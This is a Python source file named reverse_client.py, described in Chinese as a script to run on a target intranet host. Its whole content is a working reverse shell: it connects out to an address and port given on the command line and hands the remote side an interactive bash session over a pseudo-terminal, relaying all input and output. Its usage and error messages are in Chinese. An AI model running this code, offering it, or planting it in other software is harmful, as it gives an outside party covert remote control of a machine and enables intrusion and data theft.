#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   reverse_client.py
@Time    :   2022/04/19 17:27:15
@Author  :   willingboy 
@Contact :   willingboys@gmail.com
@Desc    :   目标内网主机运行脚本
'''

import os
import sys
import socket 
import subprocess
import selectors

def farTTY(host,port):
    sel=selectors.DefaultSelector()
    master_fd, slave_fd = os.openpty()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    def recv(conn:socket.socket):
        tmp=conn.recv(1024)
        os.write(master_fd,tmp)

    def send(fd):
        tmp=os.read(fd,1024)
        sys.stdout.buffer.write(tmp)
        sys.stdout.flush()
        sock.send(tmp)

    subp = subprocess.Popen(['bash'],
                     stdin=slave_fd,
                     stdout=slave_fd,
                     stderr=slave_fd,
                     preexec_fn=os.setsid,
                     env=dict(os.environ, TERM='xterm-256color'))
    sel.register(sock,selectors.EVENT_READ,recv)
    sel.register(master_fd,selectors.EVENT_READ,send)
    while subp.poll() is None :
        try:
            events=sel.select()
            for key,mask in events:
                callback=key.data
                callback(key.fileobj)
        except (ConnectionError,KeyboardInterrupt):
            break
    sock.close()
    subp.kill()
    os.close(master_fd)

if __name__ == '__main__':
    args = sys.argv
    try:
        ip = args[args.index('-ip')+1]
        port = int(args[args.index('-port')+1])
        farTTY(ip, port)
    except ConnectionRefusedError:
        print('服务器进程没启动...')
    except (TypeError, ValueError):
        print("使用参数:")
        print(f'{" "*3}-ip [ip] -port [port]')